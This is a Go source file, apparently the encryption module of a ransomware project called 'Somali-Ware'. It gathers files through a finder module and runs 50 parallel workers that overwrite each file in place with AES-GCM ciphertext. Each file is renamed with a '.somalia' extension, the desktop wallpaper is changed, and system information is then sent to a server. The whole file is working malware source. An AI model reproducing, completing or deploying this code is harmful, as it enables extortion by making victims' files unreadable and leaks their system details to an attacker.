package encryption

import (
	"Somali-Ware/modules/annoying/background"
	"Somali-Ware/modules/cache"
	"Somali-Ware/modules/finder"
	"Somali-Ware/modules/system"
	"Somali-Ware/server"
	"Somali-Ware/settings"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"os"
	"sync"
	"time"
)

const workerCount = 50

func StartEncryption() {
	var wg sync.WaitGroup
	startTime := time.Now()
	done := make(chan struct{})

	if !settings.Testing {
		go background.SetWallpaper()
	}

	// wait for GlobalStart to be true if not bypassed
	if !settings.Bypass {
		cache.CacheMutex.Lock()
		for !cache.GlobalStart {
			cache.CacheCond.Wait()
		}
		cache.CacheMutex.Unlock()
	} else {
		cache.GlobalStart = true
	}

	// start the finder for encryption
	wg.Add(1)
	go func() {
		defer wg.Done()
		finder.Finder(false)
	}()

	// start the encrypter
	wg.Add(1)
	go func() {
		defer wg.Done()
		encrypter(done)
	}()

	// cache monitor
	go cache.MonitorCache(done)

	wg.Wait()

	info, err := system.GetSystemInfo()
	if err != nil {
		fmt.Println(err)
		return
	}

	server.SendSystemData(info)

	endTime := time.Now()
	duration := endTime.Sub(startTime)
	fmt.Println(cache.FilesFound, "files found")
	fmt.Println(cache.FilesError, "files errored")
	fmt.Printf("Encryption completed in %s\n", duration)
}

func encrypter(done <-chan struct{}) {
	filesToEncrypt := make(chan string, workerCount*2)

	var wg sync.WaitGroup
	for i := 0; i < workerCount; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			worker(filesToEncrypt)
		}()
	}

	go func() {
		defer close(filesToEncrypt)
		for {
			processFilesToEncrypt(filesToEncrypt)
			select {
			case <-done:
				return
			default:
				time.Sleep(1 * time.Second)
			}
		}
	}()

	wg.Wait()
}

func processFilesToEncrypt(filesToEncrypt chan<- string) {
	cache.CacheMutex.Lock()
	defer cache.CacheMutex.Unlock()

	for len(cache.Cache) > 0 {
		filePath := cache.Cache[0]
		cache.Cache = cache.Cache[1:]
		filesToEncrypt <- filePath
	}
}

func worker(filesToEncrypt <-chan string) {
	block, err := aes.NewCipher(settings.Key)
	if err != nil {
		fmt.Printf("Error creating cipher block: %v\n", err)
		return
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		fmt.Printf("Error creating GCM: %v\n", err)
		return
	}

	for filePath := range filesToEncrypt {
		if err := encryptFile(filePath, gcm); err != nil {
			//fmt.Printf("Error encrypting file %s: %v\n", filePath, err)
			cache.FilesError++
		}
		cache.FilesFound++
	}
}

func encryptFile(filePath string, gcm cipher.AEAD) error {
	file, err := os.OpenFile(filePath, os.O_RDWR, 0644)
	if err != nil {
		return fmt.Errorf("failed to open file: %w", err)
	}
	defer file.Close()

	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return fmt.Errorf("failed to generate nonce: %w", err)
	}

	if settings.Testing {
		return nil
	}

	plaintext, err := io.ReadAll(file)
	if err != nil {
		return fmt.Errorf("failed to read file content: %w", err)
	}

	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)

	if err := file.Truncate(0); err != nil {
		return fmt.Errorf("failed to truncate file: %w", err)
	}

	if _, err := file.Seek(0, io.SeekStart); err != nil {
		return fmt.Errorf("failed to seek file: %w", err)
	}

	if _, err := file.Write(ciphertext); err != nil {
		return fmt.Errorf("failed to write ciphertext: %w", err)
	}

	if err := file.Close(); err != nil {
		return fmt.Errorf("failed to close file: %w", err)
	}

	newFilePath := filePath + ".somalia"
	if err := os.Rename(filePath, newFilePath); err != nil {
		return fmt.Errorf("failed to rename file: %w", err)
	}

	return nil
}
